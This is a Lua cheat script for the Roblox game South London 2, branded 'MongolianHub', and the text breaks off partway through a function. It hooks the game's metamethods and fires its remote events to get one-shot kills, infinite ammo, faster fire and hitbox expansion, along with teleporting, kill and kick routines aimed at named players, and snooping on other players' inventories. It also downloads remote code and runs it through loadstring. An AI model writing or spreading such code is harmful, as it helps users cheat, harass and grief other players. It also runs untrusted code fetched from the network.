
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

local GUI = Mercury:Create{
    Name = "MongolianHub",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Rust,
    Link = "https://MongolianHub.us"
}

local MainTab = GUI:Tab{
	Name = "Info",
	Icon = "rbxassetid://7193212718"
}

MainTab:Label{
	Text = "Hello there " .. game.Players.LocalPlayer.Name .. ".",
	Description = "Welcome to MongolianHub, South London 2"
}

MainTab:Label{
	Text = "Found a bug?",
	Description = "DM zR1#0001"
}

MainTab:Label{
	Text = "Who owns MongolianHub?",
	Description = "MongolianHub was made by zR1#0001"
}

local LocalTab = GUI:Tab{
	Name = "LocalPlayer",
	Icon = "rbxassetid://6157200594"
}

LocalTab:Slider{
	Name = "Walkspeed",
    Default = 0,
	Min = 0,
	Max = 300,
	Description = nil,
	Callback = function(run)
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = run
    end
}


LocalTab:Button{
	Name = "Fly",
	Description = "Allows you to fly.",
	Callback = function() 
		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Head
		local flying = false
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 400
		local speed = 5000
		
		function Fly()
		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
		plr.Character.Humanoid.PlatformStand = true
		if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
		speed = speed+.5+(speed/maxspeed)
		if speed > maxspeed then
		speed = maxspeed
		end
		elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
		speed = speed-1
		if speed < 0 then
		speed = 0
		end
		end
		if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
		bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
		lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
		elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
		bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
		else
		bv.velocity = Vector3.new(0,0.1,0)
		end
		bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 70
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
		if key:lower() == "v" then
		if flying then flying = false
		else
		flying = true
		Fly()
		end
		elseif key:lower() == "w" then
		ctrl.f = .6
		elseif key:lower() == "s" then
		ctrl.b = -.6
		elseif key:lower() == "a" then
		ctrl.l = -.6
		elseif key:lower() == "d" then
		ctrl.r = .6
		end
		end)
		mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
		ctrl.f = 0
		elseif key:lower() == "s" then
		ctrl.b = 0
		elseif key:lower() == "a" then
		ctrl.l = 0
		elseif key:lower() == "d" then
		ctrl.r = 0
		end
		end)
		Fly()
		GUI:Notification{
			Title = "Fly",
			Text = "(V) to fly and unfly",
			Duration = 3,
			Callback = function() end
		}
		end
}

LocalTab:Textbox{
	Name = "JumpPower",
	Description = nil,
	Callback = function(power)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = power
    end
}

LocalTab:Button{
	Name = "No Jump Cooldown",
	Description = "Disables the jumping cooldown.",
	Callback = function()
        local InfiniteJumpEnabled = true
        game:GetService("UserInputService").JumpRequest:connect(function()
            if InfiniteJumpEnabled then
                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
            end
        end) 
    end
}

LocalTab:Button{
	Name = "Infinite Stats",
	Description = "Doesn't make you run out of hunger/stamina.",
	Callback = function() 
        game:GetService"RunService".RenderStepped:Connect(function()
            game.Players.LocalPlayer.Valuestats.Hunger.Value = 100
            game.Players.LocalPlayer.Valuestats.Stamina.Value = 100
			game.Player.LocalPlayer.Valuestats.Health.Value = 200
        end)
    end
}

LocalTab:Button{
	Name = "Infinite Skittles",
	Description = "Allows you to take more damage and run faster.",
	Callback = function() 
			pcall(function()
				while wait() do
					game:GetService("Players").LocalPlayer.PlayerGui.Run.Value.Value = true
					game.Players.LocalPlayer.Character.Resistance.Value = true
					game:GetService("Workspace").LocalPlayer.Resistance = true
				end
			end)
		end
}

LocalTab:Button{
	Name = "Click TP",
	Description = "Allows you to tp.",
	Callback = function() 
		local plr = game:GetService("Players").LocalPlayer
		local mouse = plr:GetMouse()
		
		local tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = game.Players.LocalPlayer.Name.."TP"
		
		tool.Activated:Connect(function()
		local root = plr.Character.HumanoidRootPart
		local pos = mouse.Hit.Position+Vector3.new(0,2.5,0)
		local offset = pos-root.Position
		root.CFrame = root.CFrame+offset
		end)
		
		tool.Parent = plr.Backpack
	end
}

LocalTab:Button{
	Name = "Anti AFK",
	Description = "Stops you being kicked after 20m.",
	Callback = function() 
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	   end)
	end,
}

LocalTab:Button{
	Name = "BTools",
	Description = "Destroy walls to shoot/walk through them.",
	Callback = function()
        local tool1 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
        tool1.BinType = "Hammer" 
    end
}

LocalTab:Button{
	Name = "Graphics",
	Description = "Better visuals.",
	Callback = function()
     -- Roblox Graphics Enhancher
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = true
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = true
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = true
bloom.Intensity = 3
bloom.Size = 45
bloom.Threshold = 5

blur.Enabled = false
blur.Size = 2

-- settings }


if config.ColorCorrection then
	color.Enabled = false
end

if config.Terrain then
	-- settings {
	ter.WaterColor = Color3.fromRGB(10, 10, 24)
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end

if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
	end
end

}

LocalTab:Button{
	Name = "Anti Blur",
	Description = "Removes the annoying blur when you die.",
	Callback = function()
		while wait() do
			for fd, fe in pairs(game:GetService("Workspace").Camera:GetChildren()) do
			  fe:Destroy()
			end
	  end
	  if game:GetService("Players").LocalPlayer.PlayerGui.Dmg then
		game:GetService("Players").LocalPlayer.PlayerGui.Dmg:Destroy()
		end
	end,
}

LocalTab:Toggle{
	Name = "Auto Pickup Tols",
	Description = "Pickup tools people drop.",
	Callback = function() 
        local g = game.Workspace.tools

    for fk, fl in pairs((g:GetChildren())) do
    if fl:IsA("Tool") and fl.Name == "Fist" and fl.Name ~= "Phone" and fl.Name ~= "Crate" then
       game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(fl)
       break
   end
end
    end
}

LocalTab:Toggle{
	Name = "Safe Mode",
	Description = "Teleports you to a hidden area if your about to die.",
	Callback = function() 
        local tp = game.Players.LocalPlayer.Character.HumanoidRootPart

        local on = true
        while on do
            task.wait(0.1)
            if game.Players.LocalPlayer.Character.Humanoid.Health > 70 then
            elseif game.Players.LocalPlayer.Character.Humanoid.Health <= 70 then
                local startpos1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position
                repeat
                    wait(0.05)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-146.748886, 3.85716486, 1330.50427, 0.989451289, 1.18913936e-08, 0.144866109, -1.3166213e-08, 1, 7.84125653e-09, -0.144866109, -9.66587876e-09, 0.989451289)
                until game.Players.LocalPlayer.Character.Humanoid.Health > 70
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(startpos1)
            end
        end
     
        end,
}

local CharacterTab = GUI:Tab{
	Name = "Character",
	Icon = "rbxassetid://3944664684"
}

CharacterTab:Button{
	Name = "Building Bypass",
	Description = "Loads all the buildings.",
	Callback = function() 
        game.ReplicatedStorage.Places.Parent = game.Workspace
    end
}

CharacterTab:Slider{
	Name = "Field Of View",
    Default = 50,
    Min = 50,
    Max = 120,
	Description = nil,
	Callback = function(fov)
		while task.wait() do
			game.player.FeildOfView = fov
				   end
			   end
}

CharacterTab:Button{
	Name = "Anti Camera Bob",
	Description = "Remove the annoying shaking whilst running.",
	Callback = function() 
		repeat
			wait()
	if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob") then
		game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob"):Destroy()
	end
	until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob")
	end,
}

CharacterTab:Button{
	Name = "Buy Food",
	Description = "Allows you to buy food fast.",
	Callback = function() 
		local args = {
			[1] = "Fridge"
		}
		
		game:GetService("ReplicatedStorage").gorillaservice:FireServer(unpack(args))
	end,
}

CharacterTab:Button{
	Name = "Anti Ragdoll",
	Description = "Remove the ragdoll when you die.",
	Callback = function() 
		game:GetService("RunService").Stepped:Connect(function()
			if game:GetService("Players").LocalPlayer.Character.Head.EDead then
				game:GetService("Players").LocalPlayer.Character.Head.EDead:Destroy()
	game.Players.LocalPlayer.Character:FindFirstChild("Ragdoller"):Destroy()
	game.Players.LocalPlayer.Character:FindFirstChild("HurtSystem"):Destroy()
	end
	end)
	end,
}

local CombatTab = GUI:Tab{
	Name = "Combat",
	Icon = "rbxassetid://7485051715"
}

CombatTab:Button{
	Name = "One Shot",
	Description = "Kill the person in one shot.",
	Callback = function() 
		local settings = {repeatamount = 20}
		local mt = getrawmetatable(game)
		local old = mt.__namecall
		
		setreadonly(mt, false)
		
		task.spawn(function()
		mt.__namecall = function(self, ...)
		  local args = {...}
		  local method = getnamecallmethod();
		  if method == "FireServer" and self.Name == "Impact" then
			  for i = 1, settings.repeatamount do
				  old(self, ...)
			  end;
		  end;
		  return old(self, ...)
		end
		end)
		setreadonly(mt, true)
		   end,
}

CombatTab:Toggle{
	Name = "Push Aura",
	Description = "Push people that come near you.",
	Callback = function(bool)
       _G.Push = bool
       while _G.Push == true do
           wait()
           local char = game.Players.LocalPlayer.Character
           if char and char:FindFirstChild("Fist") then
               local Event = char.Fist.LocalScript.Script.legma
               Event:FireServer()
               for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                   if v ~= game.Players.LocalPlayer then
                       local all = v
                       local Event = char.Fist.LocalScript.p
                       Event:FireServer(all)
                   end
               end
           end
       end
   end,
}

CombatTab:Button{
	Name = "Infinite Ammo",
	Description = "Shoot infinitely.",
	Callback = function() 
		local oldK; oldK = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			args = {...}
			if tostring(self) == "Fire" and args[2] == true then
				args[2] = false
				return oldK(self, unpack(args))
			end
			return oldK(self, ...)
		 end))
			end,
}

CombatTab:Button{
	Name = "Fire Rate",
	Description = "Shoot super fast.",
	Callback = function() 
		local old = nil

		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.ClassName == "Tool" and v:FindFirstChild("Pistol") then
		   old = v
		end
		end
		local new = getsenv(old:FindFirstChild("Pistol"))
		local hookOld = function(number)
		debug.setconstant(new.OnFire, 70, number)
		end
		
			   local script = nil
		
			   for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				   if v.ClassName == "Tool" then
					   script = v
				   end
			   end
			   
			   local senv = getsenv(script)
			   local constant = debug.getconstant(senv.OnFire, 15)
			   debug.setconstant(senv.OnFire, 15, -1)
		   end,
}

CombatTab:Button{
	Name = "Anti Recoil",
	Description = "Stops gun from bobbing.",
	Callback = function() 
		local gun = nil

		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.ClassName == "Tool" then
				print(v.Name .. "Was Found")
				gun = v
			end
		end
		
		
		local get = gun:FindFirstChild("Pistol")
		get.Parent.Recoil.AnimationId = "rbxassetid://1234567"
		
		local hook
		hook = hookfunction(getrenv().delay, newcclosure(function(...)
			local args = {...}
			local caller = getcallingscript()
			
			if caller == get then
				if typeof(args[2]) == "function" then
					args[2] = function()
						print("hooked")
					end
				end
			end
			return hook(table.unpack(args))
		end))
	end,
}

local AimlockTab = GUI:Tab{
	Name = "Extra",
	Icon = "rbxassetid://6157097229"
}

AimlockTab:Button{
	Name = "Hitbox Expander",
	Description = "Expands head hitbox.",
	Callback = function() 
		function getplrsname()
			for i,v in pairs(game:GetChildren()) do
				if v.ClassName == "Players" then
					return v.Name
				end
			end
		end
		local players = getplrsname()
		local plr = game[players].LocalPlayer
 
		while  wait(1) do
			coroutine.resume(coroutine.create(function()
				for _,v in pairs(game[players]:GetPlayers()) do
					if v.Name ~= plr.Name and v.Character then
						v.Character.Head.CanCollide = false
						v.Character.Head.Material = "Plastic"
						v.Character.Head.Transparency = 0.4
						v.Character.Head.Size = Vector3.new(4.1,4.1,4.1)
					end
				end
			end))
		end
	end,
}

AimlockTab:Button{
	Name = "Name ESP",
	Description = "Displays all players name above their head.",
	Callback = function() 
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua',true))()
    end
}

local TargetTab = GUI:Tab{
	Name = "Target",
	Icon = "rbxassetid://6034452643"
}

TargetTab:Button{
	Name = "Safe and Player Stats",
	Description = "Check a player Stats, Safe",
	Callback = function() 
		rconsoleclear()

		rconsoleprint('@@GREEN@@')
		
		rconsoleprint('\nH')
		wait(0.1)
		rconsoleprint('e')
		wait(0.1)
		rconsoleprint('l')
		wait(0.1)
		rconsoleprint('l')
		wait(0.1)
		rconsoleprint('o')
		wait(0.1)
		rconsoleprint('!\n')
		
		rconsolename('SL2 Inventory and Admin Weapon Checker')
		
		rconsoleprint('@@GREEN@@')
		
		rconsoleprint('zR1 \n')
		
		wait(1)
		
		rconsolewarn('Command is !check {username} (Full Player Username)\n')
		
		rconsoleprint('@@RED@@')
		
		local cmd = "!check"
		game.Players.LocalPlayer.Chatted:Connect(function(msg)
			local split = msg:split(' ')
			if type(split[1]) == 'string' and split[1]:lower() == cmd and type(split[2]) == 'string' then
				local target = split[2]
				if game.Players:FindFirstChild(target) and game.Players[target]:FindFirstChild('Characterstats') then
					local player = game.Players[target]
					if player:FindFirstChild('Characterstats') then
						rconsoleprint("\nFirst Name: "..player.Characterstats.Firstname.Value)
						if player:FindFirstChild('Characterstats') then
							rconsoleprint('\nLast Name: '..player.Characterstats.Lastname.Value)
							end
						if player:FindFirstChild('Valuestats') then
							rconsoleprint('\nMoney: \n'..player.Valuestats.Wallet.Value)
						end
						if player:FindFirstChild('Valuestats') then
						rconsoleprint('\nMoney in Bank: \n'..player.Valuestats.Bank.Value)
						end
						local ItemNum = 0
						rconsoleprint('\nSafe: \n')
						for i,v in pairs(player.SafeStats:GetChildren()) do
							if v:IsA('StringValue') then
							ItemNum = ItemNum + 1
							rconsoleprint('@@GREEN@@')
							rconsoleprint(ItemNum..': '..v.Value.. ' \n')
							end
						end
					end
					wait(1)
					rconsoleprint('@@LIGHT_MAGENTA@@')
					rconsoleprint('\n---ALL PLAYERSTATS---')
					rconsoleprint('\n')
				
					rconsoleprint('\nRoblox Display Name: '..player.DisplayName)
					rconsoleprint('\nRoblox Username: '..player.Name)
					rconsoleprint('\nRoblox User ID: '..player.UserId)
				
					rconsoleprint('\n')
				
					rconsoleprint('\nSkin Tone: '..player.Characterstats.Skintone.Value)
					rconsoleprint('\nBody Type: '..player.Characterstats.BodyType.Value)
					rconsoleprint('\nShirt: '..player.Characterstats.Shirt.Value)
					rconsoleprint('\nPants: '..player.Characterstats.Pants.Value)
					rconsoleprint('\nChains: '..player.Characterstats.Chains.Value)
					rconsoleprint('\nGender: '..player.Characterstats.Gender.Value)
					rconsoleprint('\nHair: '..player.Characterstats.Hair.Value)
					rconsoleprint('\nAccessories: '..player.Characterstats.Accessories.Value)
					rconsoleprint('\nFace: '..player.Characterstats.Face.Value)
					rconsoleprint('\nFace Accessories (Tattoos): '..player.Characterstats.FaceAccessories.Value)
				
					rconsoleprint('\n\nKarma:'..player.Valuestats.Karma.Value)
					rconsoleprint('\nLevel:'..player.Valuestats.Level.Value)
					rconsoleprint('\nHunger (Percentage):'..player.Valuestats.Hunger.Value)
					rconsoleprint('\nStamina:'..player.Valuestats.Stamina.Value)
					rconsoleprint('\nIs user using New Aim Engine?:'..player.Valuestats.NewAim.Value)
					rconsoleprint('\nCar Fuel/Gas:'..player.Valuestats.CarGas.Value)
					rconsoleprint('\nLevel:'..player.Valuestats.Level.Value)
				end
			end
		end)
	end
}

TargetTab:Button{
	Name = "Admin Guns Search",
	Description = "Search for admin guns in your game.",
	Callback = function() 
		local admin_guns = {
			"PumpShotgun",
			"Mop",
			"DracoD",
			"Draco",
			"GlockE",
			"SupremeGlock",
			"NinjaKatana",
			"RPG",
			"DualKatana",
			"ZombieTool",
			"Glock27",
			"PinkRevolver",
			"MacS",
			"Purple",
			"S&W Revolver",
			"KnifeG",
			"Katana",
			"BigMacheteG",
			"BigMachete",
			"M24",
			"M24S",
			"GlockSwitch",
			"PinkRev"
		}
		
		rconsoleclear()
		rconsoleprint('@@LIGHT_MAGENTA@@')
		rconsoleprint(string.rep('-', 25))
		
		local found = false
		
		for i,v in pairs(game:service'Players':GetPlayers()) do
			if v:FindFirstChild("SafeStats") then
				local user_admin_guns = {}
				for itemIndex, item in pairs(v.SafeStats:GetChildren()) do
					if table.find(admin_guns, item.Value) then
						if item["SS" .. string.sub(item.Name, 2)].Value == -1 then
							table.insert(user_admin_guns, item.Value)
						else
							table.insert(user_admin_guns, item.Value .. " - " .. item["SS" .. string.sub(item.Name, 2)].Value .. " clips")
						end
					end
				end
				if #user_admin_guns > 0 then
					rconsoleprint("\n"..v.Name .. " has " .. #user_admin_guns .. " admin item(s) admin items found; \n" .. table.concat(user_admin_guns, "\n") .. "")
					rconsoleprint("\n")
					rconsoleprint(string.rep('-', 25))
					found = true
				end
			end
		end
		
		if not found then
		   rconsoleprint('no players have admin items in safes')
		   rconsoleprint(string.rep('-', 25))
		end
	end,
}

TargetTab:Textbox{
	Name = "Kill Player",
	Description = "Teleport to Player and kill them.",
	Callback = function(text)
		for i,v in pairs(game.Players:GetChildren()) do
		if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
		text = v.Name
		end
		end
		if not game.Players.LocalPlayer.Character:FindFirstChild("Fist") then
		   game.Players.LocalPlayer.Backpack.Fist.Parent = game.Players.LocalPlayer.Character
		end
		
		local alive = true
		local name = text
		local kid = game.Players.LocalPlayer.Character
		local kiddie = game.Players[name].Character
		
		local ohInstance1 = game.Players[name].Character.Humanoid
		local ohNil2 = nil
		local ohNumber3 = 1
		local ohInstance4 = game.Players[name].Character.Head
		local ohBoolean5 = true
		local ohVector36 = Vector3.new()
		local ohBoolean7 = false
		while alive do
			task.wait(0.05)
		game.Players.LocalPlayer.Character.Fist.LocalScript.Script.e:FireServer(ohInstance1, ohNil2, ohNumber3, ohInstance4, ohBoolean5, ohVector36, ohBoolean7)
		kid.HumanoidRootPart.CFrame = kiddie.HumanoidRootPart.CFrame
		
		local args = {
			[1] = "MongolianHub | Best Script Going",
			[2] = "All"
		}
		
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			if game.Players[name].Character.Humanoid.Health == 0 then
				  alive = false
		end
		end
		   end,
		
		   Default = "Player",
		   Description = "Type the player's name here.",
		
		   OnlyNumeric = false,
}

TargetTab:Textbox{
	Name = "CBring Player",
	Description = "[CS] Bring Player",
	Callback = function(text) 
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
			text = v.Name
			end
		 end
		 local name = text
		 function cbringTarget()
			repeat
				task.wait()
			 game.Players[name].Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 3.6)
			 until game.Players[name].Character.Humanoid.Health == 0
		 end
		 
		 cbringTarget()
		 
			end,
		 
			Default = "Player",
			Description = "Type the player's name here.",
		 
			OnlyNumeric = false,
}

TargetTab:Textbox{
	Name = "View Player",
	Description = "View a player.",
	Callback = function(text) 
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
			text = v.Name
			end
			end
			game.Workspace.CurrentCamera.CameraSubject = game.Players[text].Character
			task.wait(15)
			game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			   end,
			
			   Default = "Player",
			   Description = "Type the player's name here.",
			
			   OnlyNumeric = false,
}

TargetTab:Textbox{
	Name = "Teleport To Player",
	Description = "Teleport to a Player of your choice.",
	Callback = function(text)
		for i,v in pairs(game.Players:GetChildren()) do
		if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
		text = v.Name
		end
		end
			   local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
			   local p2 = text
			   local pos = p1.CFrame
		   
			   p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
		   end,
		
		   Default = "Player",
		   Description = "Type the player's name here.",
		
		   OnlyNumeric = false,
}

TargetTab:Textbox{
	Name = "Kick Player",
	Description = "Kick a player you don't like.",
	Callback = function(text)
		for i,v in pairs(game.Players:GetChildren()) do
		if (string.sub(string.lower(v.Name),1,string.len(text))) == string.lower(text) then
		text = v.Name
		end
		end
		if not game.Players.LocalPlayer.Character:FindFirstChild("Fist") then
		   game.Players.LocalPlayer.Backpack.Fist.Parent = game.Players.LocalPlayer.Character
		end
		
		local alive = true
		local name = text
		local kid = game.Players.LocalPlayer.Character
		local kiddie = game.Players[name].Character
		local startpos1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		task.wait()
		
		local ohInstance1 = game.Players[name].Character.Humanoid
		local ohNil2 = nil
		local ohNumber3 = 1
		local ohInstance4 = game.Players[name].Character.Head
		local ohBoolean5 = true
		local ohVector36 = Vector3.new()
		local ohBoolean7 = false
		while alive do
			task.wait(0.05)
		game.Players.LocalPlayer.Character.Fist.LocalScript.Script.e:FireServer(ohInstance1, ohNil2, ohNumber3, ohInstance4, ohBoolean5, ohVector36, ohBoolean7)
		kid.HumanoidRootPart.CFrame = kiddie.HumanoidRootPart.CFrame
		
		local args = {
			[1] = "MongolianHub | Best Script Going",
			[2] = "All"
		}
		
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
		if game.Players[name].Character.Humanoid.Health <= 25 or alive == false then
		   local args = {
			   [1] = game:GetService("Players")[name]
		   }
		   game:GetService("ReplicatedStorage").CarryingServer:FireServer(unpack(args))
		
		repeat
		   task.wait(0.2)
		   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2740.23071, -184.292358, -2930.51563, -0.684846103, 0.106422901, -0.720874488, 1.90580485e-09, 0.989277601, 0.146047324, 0.728687763, 0.100019939, -0.677502871)
		   task.wait(0.9)
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = startpos1
		   task.wait(0.2)
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = startpos1
		   task.wait(.2)
		   until not game.Players:FindFirstChild(name)
		end
		end
		   end,
		
		   Default = "Player",
		   Description = "Type the player's name here.",
		
		   OnlyNumeric = false,
}

local CarTab = GUI:Tab{
	Name = "Car Mods",
	Icon = "rbxassetid://6034754441"
}

CarTab:TextBox{
	Name = "HorcePower",
	Description = "Makes car fast. brum brum..",
	Callback = function(text)
		local cMod = require(game:GetService("Workspace")[game.Players.LocalPlayer.Name.."'s Car"]["A-Chassis Tune"])
			
		cMod.LoadDelay = 0
		cMod.Horsepower = text
		   end,
		
		   OnlyNumeric = true,
}

CarTab:TextBox{
	Name = "Torque",
	Description = "Makes car have alot more power.",
	Callback = function(text)
		local cMod = require(game:GetService("Workspace")[game.Players.LocalPlayer.Name.."'s Car"]["A-Chassis Tune"])
			
		cMod.LoadDelay = 0
		cMod.Torque = text
		   end,
		
		   OnlyNumeric = true,
}

CarTab:Button{
	Name = "Infinite Petrol",
	Description = "Doesn't run out of petrol for the car.",
	Callback = function() 
        game:GetService"RunService".RenderStepped:Connect(function()
            game.Players.LocalPlayer.Valuestats.CarGas.Value = 100
        end)
    end,
}

local MiscTab = GUI:Tab{
	Name = "Misc",
	Icon = "rbxassetid://6034509993"
}

MiscTab:Textbox{
	Name = "Change RP Name",
	Description = "Changes RP Name.",
	Callback = function(text)
		game.Players.LocalPlayer.Character.Head.Gui.MainFrame.NameLabel.Text = text
		end,
	 
		OnlyNumeric = false,
}

MiscTab:Textbox{
	Name = "Change RP Level",
	Description = "Changes RP Level.",
	Callback = function(text)
		game.Players.LocalPlayer.Character.Head.Gui.MainFrame.Age.Text = text
		end,
		 
			OnlyNumeric = false,
}

MiscTab:Textbox{
	Name = "Change RP Rank",
	Description = "Changes RP Rank",
	Callback = function(text) 
		game.Players.LocalPlayer.Character.Head.Gui.MainFrame.Rank.Text = text
    end,

		OnlyNumeric = false,
}

MiscTab:Button{
	Name = "Faceless",
	Description = "Remove your face.",
	Callback = function() 
			game.Players.LocalPlayer.Character.Head:FindFirstChild("Sad"):Destroy()
			game.Players.LocalPlayer.Character.Head:FindFirstChild("Stare"):Destroy()
			game.Players.LocalPlayer.Character.Head:FindFirstChild("Mad"):Destroy()
		end,
}

MiscTab:Button{
	Name = "No Name",
	Description = "Remove your name.",
	Callback = function()
		if game:GetService("Players").LocalPlayer.Character.Head.Gui then
			game:GetService("Players").LocalPlayer.Character.Head.Gui:Destroy()
		end
	end,
}

MiscTab:Button{
	Name = "No Legs",
	Description = "Remove your legs.",
	Callback = function()
		game:GetService("Players").LocalPlayer.Character.LeftUpperLeg:Destroy()
		game:GetService("Players").LocalPlayer.Character.LeftLowerLeg:Destroy()
		game:GetService("Players").LocalPlayer.Character.RightUpperLeg:Destroy()
		game:GetService("Players").LocalPlayer.Character.RightLowerLeg:Destroy()
	end,
}

MiscTab:Button{
	Name = "No Arms",
	Description = "Remove your arms.",
	Callback = function() 
			game:GetService("Players").LocalPlayer.Character.RightUpperArm:Destroy()
			game:GetService("Players").LocalPlayer.Character.RightLowerArm:Destroy()
			game:GetService("Players").LocalPlayer.Character.LeftUpperArm:Destroy()
			game:GetService("Players").LocalPlayer.Character.LeftLowerArm:Destroy()
		end,
}

MiscTab:Button{
	Name = "Fake Korblox",
	Description = "Gives you fake korblox.",
	Callback = function()
		game:GetService("Players").LocalPlayer.Character.LeftUpperLeg:Destroy()
		game:GetService("Players").LocalPlayer.Character.LeftLowerLeg:Destroy()
	end,
}

MiscTab:Button{
	Name = "No Head",
	Description = "Remove your head.",
	Callback = function()
		game.Players.LocalPlayer.Character.Head.Neck:Destroy()
 game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
 game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
 game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
 game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
 game.Players.LocalPlayer.Character.Head.Massless = true
 game.Players.LocalPlayer.Character.Head.CanCollide = false
 heazd = true
		  while heazd == true do
			pcall(function()
